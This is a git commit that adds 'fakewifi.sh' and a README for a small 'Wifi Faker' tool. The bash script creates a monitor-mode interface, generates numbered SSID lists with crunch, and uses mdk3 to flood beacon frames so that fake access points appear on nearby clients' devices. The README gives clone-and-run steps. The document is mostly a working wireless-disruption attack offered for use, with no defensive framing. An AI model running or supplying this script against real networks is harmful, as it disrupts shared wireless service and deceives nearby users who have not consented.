f12ca1958b303e628c33f1104d61d7560024c5a5
iwuaizl <snezzsp@gmail.com>
2019-03-16 11:39:58 +0100

    updated

---
+++ fakewifi.sh
@@ -0,0 +1,66 @@
+printf "\e[1;36m __        __  _    __   _ \e[1;32m  _____           _                  \e[0m\n"
+printf "\e[1;36m \ \      / / (_)  / _| (_)\e[1;32m |  ___|   __ _  | | __   ___   _ __ \e[0m\n"
+printf "\e[1;36m  \ \ /\ / /  | | | |_  | |\e[1;32m | |_     / _' | | |/ /  / _ \ | '__|\e[0m\n"
+printf "\e[1;36m   \ V  V /   | | |  _| | |\e[1;32m |  _|   | (_| | |   <  |  __/ | |   \e[0m\n"
+printf "\e[1;34m    \_/\_/    |_| |_|   |_|\e[1;33m |_|      \__,_| |_|\_\  \___| |_|  \e[0m\n" 
+printf "\n"
+printf "\e[1;77m\e[43mWifi Faker v1.0, Author: @iwuaizl (Github/Twitter) \e[0m\n\n"           #hey its me
+
+
+#read -p $'\e[1;92mWifi number: \e[0m' wnumber
+
+#if [ $wnumber -gt 10 ]
+#then
+#	echo not supported, max 10
+#	exit
+#fi
+
+fake=$(cat /sys/class/net/mon0/carrier)
+printf '\e[1;92mChecking virtual interface... \e[0m'
+sleep 1
+
+if [ $fake ]
+then
+	printf '\e[1;92mOK\e[0m \n'
+	sleep 1
+else
+	printf '\e[1;31mERROR\e[0m \n'
+	printf '\e[1;92mCreating virtual interface (\e[34mmon0\e[92m)... '
+	sleep 1
+	iw wlan0 interface add mon0 type monitor
+	printf '\e[1;92mOK\e[0m \n'
+	sleep 1
+fi
+
+read -p $'\e[1;92mGenerate list? (y/n): \e[0m' wlist
+
+
+
+if [ $wlist == "y" ]
+then
+	read -p $'\e[1;92mWifi base name: \e[0m' wifi
+	fn="$wifi@"
+	size=${#fn}
+	printf '\e[1;92mGenerating list (\e[1;34m%s\e[1;92m)... \e[1;0m' $wifi
+	crunch 2>/dev/null $size $size 0123456789 -t $fn -o wifi.lst
+	printf '\e[1;92mOK\e[0m\n'
+	sleep 1
+else
+	read -p $'\e[1;92mPath to wifi name list: \e[0m' wpath
+	wpath=${wpath}
+	chmod a+x $wpath
+fi
+
+printf '\n\e[1;92mStarting the attack... (\e[31mCtrl+C to stop\e[92m)\e[0m \n\n'
+sleep 1
+if [ $wlist == "y" ]
+then
+	mdk3 mon0 b -f wifi.lst
+else
+	mdk3 mon0 b -f $wpath
+fi
+
+
+
+
+
---
+++ readme.md
@@ -0,0 +1,14 @@
+# fakewifi
+Creates virtual interface 'mon0' to send beacon frames to show fake APs at clients using mdk3 <br>
+
+# USAGE
+git clone https://github.com/jwuaizl/fakewifi <br>
+cd fakewifi/ <br>
+chmod a+rwx fakewifi.sh <br>
+bash fakewifi.sh <br>
+
+# REQUIREMENTS
+-apt-get install <strong>mdk3</strong><br>
+-apt-get install <strong>crunch</strong><br>
+
+1 by iwuaizl
